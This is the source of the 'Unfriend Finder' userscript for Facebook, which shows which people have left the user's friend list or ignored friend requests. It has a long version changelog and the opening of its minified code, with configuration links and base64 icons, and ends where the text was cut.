// ==UserScript==
// @name           Unfriendzz Finder
// @namespace      unfriendzz_finder
// @description    Script that allows you to know who has removed you on facebook.
// @author         https://www.facebook.com/doudou
// @homepage       https://www.unfriendfinder.com/
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @icon           https://www.unfriendfinder.com/static/images/logoGM.png
// @version        40
// @date           2012-06-21
// @encoding       UTF-8
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*onnect.facebook.com/*
// @exclude        htt*://*acebook.com/connect*
// @exclude        htt*://*.facebook.com/plugins/*
// @exclude        htt*://*.facebook.com/l.php*
// @exclude        htt*://*.facebook.com/ai.php*
// @exclude        htt*://*.facebook.com/extern/*
// @exclude        htt*://*.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://*.facebook.com/contact_importer/*
// @exclude        htt*://*.facebook.com/ajax/*
// @exclude        htt*://www.facebook.com/places/map*_iframe.php*
// ==/UserScript==
//
//
//
//                            Unfriend Finder is Copyright (c) 2009-2012 Edouard Gatouillat
//                                           https://www.unfriendfinder.com
// Unfriend Finder is licensed under a Creative Commons Attribution-Noncommercial-No Derivative Works 3.0 Unported License
//              License information is available here: http://creativecommons.org/licenses/by-nc-nd/3.0/us/
//                   This full copyright section must be included in redistributions of this script
//
//
//
// Unfriend Finder
// Last changes: June 21 2012 6:00pm, dev build 40.810
//
// Main Changes
//
// Version 40:
//  [+] Added new Social Mode with Twitter. Likes and Comments with Facebook.
//  [*] Fixed display issues: Menubar link, broken layout in games and ads manager.
//  [*] Fixed cancellation of Pending Requests
//  [*] Fixed notification layout.
//  [*] False notifications should be fixed.
//  [*] Fixed Opera incompatibilities.
//  [*] Many more enhancements.
//
// No version 39
//
// Version 38:
//  [*] Fixed Unfriend informations on Timeline layout.
//  [*] Fixed Pending Requests loading forever.
//  [*] Fixed other various issues.
//
// Version 37:
//  [*] Fixed lag issue for some users on Firefox and Google Chrome.
//  [*] Fixed HTTPS issue with http:// profile pictures in awaitings requests.
//
// Version 36:
//  [*] Fixed issue affecting notifications, some of them were empty.
//  [*] Fixed major issue while loading lists for some people.
//  [*] Fixed deselection issue when trying to go back to another filter from Unfriends.
//  [*] Fixed news feed loading indefinitely while using Unfriends lists, lag issue. 
//  [*] Fixed arrows on contextual menus.
//  [*] Fixed Fanpage removed by Facebook and red box on Unfriends lists.
//  [*] Fixed position issue using the Tour tutorial.
//  [+] Added confirmation before hiding all unfriends/connections.
//  [+] Added Uninstall link in the filter menu.
// 
// Version 34:
//  [*] Fixed false notifications for friendlist having more than 3500 entries.
//  [*] Fixed menubar going on a new line for some people.
//  [*] Fixed Error message 0x0004 when refreshing page.
//  [*] Fixed display issue on accepted and ignored requests.
//  [*] Fixed ability to remove pending request.
//  [*] Fixed Hovercard issues.
//  [*] Fixed "Insecure content loaded" on Chrome, using HTTPS.
//  [*] Fixed critical error for some users.
//
// Version 33:
//  [*] Enhanced the way to start the script, avoiding more crashes.
//  [*] Changed Facebook database, more reliable.
//  [*] Enhanced Unfriends and Pending Requests detection.
//  [*] Fixed various display issues.
//
// Version 32:
//  [*] Fixed critical issue after a Facebook change.
//  [+] Added Unfriends summary on Facebook Timeline.
//  [*] Fixed nub position to left when sidebar is disabled.
//  [*] Improved webKit Notifications on Chrome.
//  [*] Updated the @match header for Chrome.
//  [*] Fixed Tour.
//  [*] Improved contextual dialogs.
//  [*] Fixed display issues with frames getting over games.
//  [*] Fixed display issues with ticker.
//  [*] Fixed notifications after a Facebook change.
//  [*] Fixed "Counter 0" when Menubar button is hidden.
//
// Version 31:
//  [*] Redrawn 16x16 "Unfriend" and "Pending Request" icons.
//  [+] Added beta support of the new FriendButton in the pending requests.
//  [*] Fixed issue in reset feature in settings.
//  [*] Fixed "Remove Connection" on pending requests.
//  [+] Added support of browser history on filters.
//  [*] Fixed bluebar links in new UI.
//  [+] Support for Internet Explorer, still few bugs but the script is working.
//  [+] Support for Safari on iPhone.
//  [*] Fixed hiding lists issue when "Unfriends" filter is clicked before the page has finished loading.
//  [*] Fixed "Hide All" link in Unfriends lists.
//  [+] Added Facebook hoverCard on profiles.
//  [+] Added new layout, "Blocks" style on unfriends list.
//  [*] Fixed issue with Greasemonkey in Ajax Requests.
//  [*] Fixed increasing notifications bug.
//  [*] Fixed filter compatibility for Google Chrome, Safari and Opera.
//  [+] Added support of webkitNotification on Chrome (Not supported by other browsers).
//  [+] Added ability to Rearrange "Unfriends" filter in the Favorites (new UI).
//  [+] Added ability to Add/Remove "Unfriends" filter to/from the Favorites (new UI).
//  [*] Fixed Messages section.
//
// Version 30:
//  [*] Fixed Filters for the new UI.
//  [*] Fixed 'Cancel All' feature on pending requests.
//  [*] Fixed display issues when switching from Group/Friends or other view to Unfriends Finder section.
//  [*] Fixed other various display issues.
//  [*] Updated Unfriends info box on profile.
//  [+] Added Esperanto, thanks to Lucas Larson.
//  [+] Added नेपाली, thanks to Binod Adhikary.
//  [+] Added বাংলা, thanks to Shahed Faisal.
//  [*] Updated non-execution for fanpages.
//
// Version 29:
//  [*] Fixed issue when trying to cancel a friend request.
//  [*] Languages updated.
//  [*] Fixed broken notifications.
//  [*] Fixed display issues.
//  [+] Added Latviešu, thanks to Viesturs Eihentāls.
//
// Version 28:
//  [*] Fixed Spammy Links issue.
//  [*] Languages updated, thanks to Jay Ranson for English UK, Benjamin Schwarz for Deutsch, and Cüneyt Oktay for Turkish.
//  [*] Fixed "<your profile> was in your friendlist" issue.
//  [+] Added मराठी, thanks to Bhooshan Harake.
//  [+] Added தமிழ், thanks to Jal Desai.
//
// Version 27:
//  [+] Added loading indicator in filter to show loading when checking unfriends.
//  [-] Removed reminder beepers on unfriends/ignored requests.
//  [*] Fixed issues with repeating notifications.
//  [*] Fixed issue with ability to Always Hide/Block an unfriend with Shift/Shift+Ctrl key.
//  [*] Changed Fanpage ID after being deleted by Facebook.
//  [*] Fixed issue with multiple instance of Bottop-right nub and Settings link in menubar.
//  [*] Probably fixed cache issue when Pending Request.
//  [*] Fixed issue with Information box on profile, which was not displayed in previous versions due to a Facebook change.
//  [*] Won't notify more than 3 times the same Unfriend.
//  [*] Fixed display issues.
//  [*] Fixed binding key issues on Opera.
//  [+] Added 한국어, thanks to Jungwook Lee.
//  [+] Added ภาษาไทย, thanks to Globe Vgl.
//  [+] Added Euskara, thanks to Arkaitz Luzuriaga.
//  [+] Added Lingua Latina, thanks to Sawyer Morgan.
//
// Version 26:
//  [*] Added @exclude for useless pages.
//  [+] Added paging for Unfriends & Reappeared.
//  [+] Added paging settings.
//  [*] Sorted profiles in lists by dates on Chrome.
//  [*] Fixed the loss of links with FFixer when having too much links in menubar.
//  [*] Fixed bug with beepers on Chrome.
//  [*] Fixed crash when 3rd party cookies were not enabled. Using Ajax() instead of XMLHttpRequest on Greasemonkey.
//  [*] Fixed HTTPS issue.
//  [+] Added dates when adding pending requests.
//  [*] Fixed wrong status set to 'Deleted or Hidden' due to a Facebook change.
//  [+] Added Nub container in bottom-right to bind beepers.
//  [+] Added an option in this container to temporary enable/disable the script.
//  [+] Added Filipino, thanks to Sebastian Gallup.
//  [+] Added ქართული, thanks to Quji Bichia, Beqa Arabuli, დიანა კვარაცხელია and Irakli Tsuladze.
//  [+] Added मराठी, thanks to Bhooshan Harake.
//
// Version 25:
//  [+] Added lag warning when having more than about 40 Unfriends in list.
//  [+] Added warning for people using remote script with Chrome. Users have to update to official version.
//  [*] Performances improved.
//  [*] Fixed incompatibilities with Firefox 4.
//  [*] Fixed issues with loading indicators on the filters.
//  [*] Fixed design bugs.
//  [*] Fixed triggers when removing friend.
//  [*] Updated notifications.
//  [*] Fixed issue when getting a lot of unfriends in one time.
//  [*] Translations updated.
//  [+] Added Español (Mexico), thanks to Saul Soto.
//  [*] Japanese updated, thanks to Masami Hirata.
//  [*] Greek updated, thanks to Puerto Rojo.
//
// Version 24:
//  [+] Added new panel to Facebook's Login screen.
//  [*] Performances improved.
//  [*] Updated to work with new Facebook Messages.
//  [+] Added Azərbaycan dili, thanks to Tural Əlisoy and Ferid Babayev.
//  [*] Fixed issues with tutorial.
//  [*] Updated new Profile integration.
//
// Version 23:
//  [*] Changed links to the new Community Page.
//  [+] Added Íslenska, thanks to Aron Guðmundsson.
//  [+] New option to only show the number of new unfriends in the counters (Menubar & Filter)
//  [*] Fixed bug when displaying unfriend, indicator was loading continuously
//  [*] Fixed "Cancel all pending Requests" feature, adding delay between each cancellation.
//  [*] Welcome box updated as a little tutorial to set up and understand the script for new users.
//      Thanks to Jay Ranson for the texts.
//  [*] Many other improvements.
//
// Version 22:
//  [*] Fixed a bug affecting the navigation keys on Facebook.
//  [*] Fixed a new bug when removing a pending request from the profile itself, the script said that the user ignored
//      the friend request.
//  [+] Added the possibility to report the Update bubble after two days.
//  [+] Added a feature that displays the old name of a profile under its new name.
//  [+] Added a close box to hide a notification from the script.
//  [+] Added links to Hide all unfriends, reappeared, ignored/accepted requests, and to cancel all pending requests.
//  [*] Fixed lag while typing on Chrome.
//  [*] Fixed filter issue on Chrome after some Facebook changes.
//  [*] Changed design on lists.
//  [*] Fixed design issues.
//  [-] Removed "Debug" in Settings, it's now recommended to use tools like Firebug or Javascript Console to get debug messages.
//  [-] Removed overlays on welcome and help messages.
//
// Version 21:
//  [*] Appearance updated
//  [*] Updated Filters style.
//  [+] Added a check for redondant deactivated profiles. They will not show up if deactivated after 1day of reactivation.
//  [*] Languages updated. Thanks to all contributors.
//  [+] Re-added Beeper for reactivated profiles.
//  [*] Performances improved.
//
// Version 20:
//  [*] Major rebuilt, code rewrited with more classes.
//  [+] Added Chrome compatibility.
//  [+] Added Opera compatibility.
//  [+] Added Safari compatibility, only on MacOS X.
//  [*] Changed the way to get the Env.user value.
//  [*] Fixed a bug that marked all new friends as "Reactivated".
//  [-] Removed GoogleSearch, unused and not working anymore.
//  [+] Added the ability to hide information message about unfriend/ignored request.
//  [+] Added the ability to reset certain values from the Reset tools in Settings.
//  [+] Added Message Center, in replacement of FanPage stream.
//  [+] Added Català, thanks to Hielo Tekmeka.
//  [+] Added Македонски, thanks to Гоце Т.
//
// Version 19:
//  [*] Fixed filter issue with different Facebook HTML.
//  [*] Changed the friends database to friends_page_search.php, more powerful.
//  [*] Fixed awaiting requests bug.
//  [*] Fixed broken notifications.
//  [*] Fixed broken information message when removing a friend.
//  [*] Fixed "Unfriends" filter position under "Friends".
//  [+] Added Português, thanks to Afonso Sousa, Ricardo Godinho & Claudia Panizza.
//  [+] Added Bosanski, thanks to Adnan Jusic.
//  [+] Added Shqip, thanks to Agon Ramizi.
//  [+] Added Български, thanks to Ivaylo Mateev.
//  [+] Added Čeština, thanks to Marek Bodinger.
//  [+] Added Bahasa Indonesia, thanks to Dhadan Mstr Dee.
//  [+] Added Polski, thanks to Michal Dobrowolski.
//  [+] Added Magyar, thanks to Peter Csaszar-Cs.
//
// Version 17:
//  [+] Added a Like Box.
//  [+] Added automatic language tool, to help you choose the right language according to Facebook's
//  [+] Added Русский, thanks to Gene Gisin.
//  [+] Added Bahasa Melayu thanks to Bateri Eye N C.
//  [+] Added 日本語 thanks to Flora Bui.
//  [+] Added Dansk thanks to Nick Kristensen.
//  [*] Fixed display bugs.
//  [*] Fixed issue with "Always Hide" feature.
//  [*] Updated other languages.
//  [*] Updated the Settings button on the Welcome screen.
//  [*] Enhanced the "Update profile picture" feature.
//
// Version 16:
//  [+] Added Leet Speak thanks to Foulques Du Peloux De Praron. :))
//  [+] Added Arabic thanks to Gassan Khoury.
//  [+] Added Hebrew thanks to Omri Ossie & Gassan Khoury.
//  [+] Added English (Upside Down) language.
//  [+] Added "Awaiting requests" & "Settings" filter.
//  [+] Added settings to the Homepage, old settings will be removed in future versions.
//  [*] Updated broken notifications due to Facebook changes.
//  [*] Fixed uiButton design, after Facebook changes.
//  [*] Updated left filter.
//  [*] Fixed the 'undefined' bug in Unfriends List.
//  [*] Fixed "Always Hide" feature.
//
// Version 15:
//  [*] Major rebuilt, code rewrited, using more classes, waiting the Facebook page to be fully loaded, minimizing errors.
//  [*] Updated the way to differentiate unfriends and deactivated profiles.
//  [+] Added Swedish thanks to Torbjörn Lygren.
//  [+] Added Traditional Chinese thanks to acedia0915.
//  [+] Added Finnish thanks to Teemu Pohjalainen.
//  [+] Added Dutch thanks to Emmanuel Gounaropoulos.
//  [+] Added Greek thanks to Emmanuel Gounaropoulos and Panayiotis Panos.
//  [+] Added German thanks to Simon Zöllner.
//  [+] Added Croatian thanks to Karmela Mestrovic.
//  [+] Added Norwegian thanks to -Mats Bakken.
//  [+] Added Turkish thanks to Emre Kep.
//  [+] Re-added Beeper that Facebook removed.
//  [+] Highlighting new unfriends/reappeared/requests ignored and accepted.
//  [+] Displaying old filters on every /friends/?filter=* page.
//  [+] Added "Always Hide" function to hide permanently redondant Unfriends.
//      Hold shift key when clicking "Hide".
//  [+] Unfriends check date are stored and displayed on lists.
//  [+] Cancel detection of unfriend when removing friend by yourself, can be disabled by setting.
//  [+] Opacity of profile picture  changed to 0.4 for profiles deactivated.
//  [+] Added contextual Help on first v15 launch.
//  [+] Added a tool to export/import all data.
//  [+] Added new setting Beeper when changing a setting.
//  [+] Added new reappeared Beeper when a profile is reactivated.
//  [+] Added new friend Beeper when someone accept your friend request.
//  [-] Script won't hide right ads anymore, use an adblock or another script to hide Facebook ads.
//  [*] Fixed a lot of display bugs.
//  [*] Fixed Multi-notification bug for the same profile, due to a Facebook issue.
//  [*] Enhanced notifications, maximum 5 notifications are displayed.
//  [*] Fixed "Update Profile Pictures" setting, that sometimes gives silhouette.
//      Using the new graph API.
//  [*] Rebuilded Welcome messages.
//  [*] Updated the way to write that the profile was in your friendlist/ignored your friend request.
// 
// Version 14:
//  [*] Fixed Facebook changes that hide the filter on the left.
//  [*] Fixed Beeper display bug.
//  [*] Hiding loading indicator when got no unfriends but many reappeared profiles.
//  [*] Fixed the "Showing Button" Loop due to Facebook Connect.
//
// Version 13:
//  [*] Fixed Missing link in menubar.
//  [*] Language update: Slovesnky
//
// Version 11:
//  [+] Added new list layout to fit in the Facebook Redesign
//  [+] Added Simplified Chinese, thanks to Luke Davies & Richard Li (Grammar Correction)
//  [*] Fixed "Profile Picture Cache" of facebook.
//  [*] New settings handler, more flexible.
//
// Version 10:
//  [*] Fixed Facebook redesign bug.
//  [+] Added Armenian (Հայերեն), thanks to Aram Bayadyan.
//  [?] Script copyrighted and released under Creative Commons.
//
// Version 9:
//  [*] Fixed critical bug.
//  [*] Updated Serbian
//
// Version 8 :
//  [*] Fixed bug that gives lots of notifications on ignored requests.
//  [*] Languages: Serbian and Slovakian completed.
//  [*] Fixed different bugs when removing unfriend/awaiting request.
//  [*] Lots of little display and behavior enhancements on lists.
//      [+] Animation when hiding Unfriend/Awaiting request/Reappeared.
//      [*] Fixed Tooltips display and behvior.
//      [*] Displaying "No Unfriend" and "No Awaiting Request" when removing the last item of the list.
//  [*] Lots of little display and behavior enhancements on notifications and beeper.
//      [*] Fixed Beeper selection.
//      [*] Hide Beeper when opening notification tab.
//      [*] Fixed notification fade animation to white.
//      [*] Hide notification counter when notification tab is already open.
//  [*] Improving notifications engine on id storage.
//
// Version 7 :
//  [*] Tiny bug fixed about \u prefix for non-ascii chars in Unfriend or awaiting names.
//  [+] Added new languages : French, Español, Italiano. Serbian, Slovakian, in progress.
//  [+] Added facebook Dialog integration.
//  [*] Notifications enabled by default.
//  [+] Added getting started's contextual dialog to lead new user to a better experience.
//  [*] Fixed "No Unfriends" display on other lists
//  [*] Fixed other display issues.
//  [+] Added new information on the profile box, to know is current profile was in your friendlist or ignored your last friend request.
//  [+] Added emergency reset in the Greasemonkey Menu.
//
// Version 6 :
//  [*] Fixed notifications.
//  [*] Fixed "undefined" names
//  [*] Fixed "Unfriend" list replaced by the "Recently Updated" list
//  [*] Fixed awaiting requests that reappears after being removed.
//  [+] Added "BeeperBox" to notify user from Unfriends, Ignored requests, and new script version.
//
// Version 5 :
//  [*] Fixed critical bug, Unfriends and Awaiting requests are hidden.
// 
// Version 4 :
//  [+] Core rewrited with class collections to handle more easily lists.
//  [+] Added update checker with button in toolbar.
//  [+] Added the state "Reappeared"
//  [*] Due to a facebook bug, changing url to retrieve all friends. Removed superfriends.php, added typeahead_search.php
//  [+] Fixed graphic bug on Unfriends bubble.
//  [+] Command registered for refreshing menubar link. (Access by rightclicking greasemonkey's head in firefox statusbar)
//  [+] Added googleSearch functionnality, to automatically search for profiles without information.
//  [+] Added notifications.
//  [+] Added settings panel :
//      [+] Added panel to manage profile display
//      [+] Added panel to export or import backups //no privacy issues.
//      [+] Added panel to manage googleSearch
//      [?] Language can't be changed at this time.
//      [+] Added panel to reset all settings.
//
// Version 3 :
//  [*] Fixed several bugs on design
//  [+] Ignored/Confirmed friend requests are shown
//  [*] Ability to remove pending request from "Awaiting List"
//  [*] Hiding tooltip "Hide unfriend", when removing one.
//  [+] Fixed bug "missing unfriends infos"
//  [+] Added the state "Profile being deactivated"
//
// For questions about all changes, check and post on :
//
// Fanpage : https://www.facebook.com/pages/Unfriend-Finder/120349238092887
//   Group : https://www.facebook.com/groups/98534953863/
//
(function UnfriendFinder(version,key){"use notifications";"use greasemonkey";var core,LANG,script,Facebook=this["unsafeWindow"]||window,that={},traced={},startTime=+new (Date),protocol=(location.protocol==="https:"?"https:":"http:"),Params={version:arguments[0].split(".")[0],built:arguments[0].split(".")[1],key:arguments[1],preview:false,dev:false,ready:false,started:false,debug:false,enabled:true,iFrame:false,isPage:false,canRun:(getFromId("blueBar")?true:false),mobile:/(iphone|touch|m)\.facebook\.com/.test(location.href),timeLoop:60,timeoutLoad:2.5,timerFooter:2,maxNotifications:8,hideFacebookBug:true,autoHideAfter:4,lang:null,body:document.body,head:document.getElementsByTagName("head")[0],protocol:protocol,host:location.host,isFan:false,groupJoigned:false,links:{page:protocol+"//www.facebook.com/pages/Unfriend-Finder/120349238092887",group:protocol+"//www.facebook.com/group.php?gid=98534953863",twitter:"https://twitter.com/unfriendfinder",donate:"https://www.unfriendfinder.com/donate",forum:"https://www.unfriendfinder.com/forum",update:"https://www.unfriendfinder.com/unfriend_finder.user.js",uninstall:"https://www.unfriendfinder.com/help/uninstallation",rsrc:(location.protocol==="https:"?"https://s-static.ak.facebook.com/rsrc.php":"http://b.static.ak.fbcdn.net/rsrc.php")},images:{noPicture:(location.protocol==="https:"?"https://s-static.ak.facebook.com":"http://b.static.ak.fbcdn.net")+"/pics/q_silhouette.gif",silhouette:{male:(location.protocol==="https:"?"https://s-static.ak.facebook.com":"http://b.static.ak.fbcdn.net")+"/images/profile/blankSilhouetteMale.png",female:(location.protocol==="https:"?"https://s-static.ak.facebook.com":"http://b.static.ak.fbcdn.net")+"/images/profile/blankSilhouetteFemale.png"},smallIndicator:(location.protocol==="https:"?"https://s-static.ak.facebook.com":"http://b.static.ak.fbcdn.net")+"/images/loaders/indicator_blue_small.gif",bigIndicator:(location.protocol==="https:"?"https://s-static.ak.facebook.com/rsrc.php":"http://b.static.ak.fbcdn.net/rsrc.php")+"/z5R48/hash/ejut8v2y.gif",dottedDelimiter:(location.protocol==="https:"?"https://s-static.ak.facebook.com/rsrc.php":"http://b.static.ak.fbcdn.net/rsrc.php")+"/zAX12/hash/75lchh0v.gif",blank:(location.protocol==="https:"?"https://s-static.ak.facebook.com/rsrc.php":"http://b.static.ak.fbcdn.net/rsrc.php")+"/z12E0/hash/8q2anwu7.gif",fanImageSmall:(location.protocol==="https:"?"https://fbcdn-profile-a.akamaihd.net/":"http://profile.ak.fbcdn.net/")+"hprofile-ak-snc4/hs236.ash2/50512_119492378113154_8293078_q.jpg",fanImage:(location.protocol==="https:"?"https://fbcdn-profile-a.akamaihd.net/":"http://profile.ak.fbcdn.net/")+"hprofile-ak-snc4/hs236.ash2/50512_119492378113154_8293078_n.jpg"},icons:{unfriends:"data:image/png;base64,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",awaitings:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAEAB03PAAAACXBIWXMAAA7DAAAO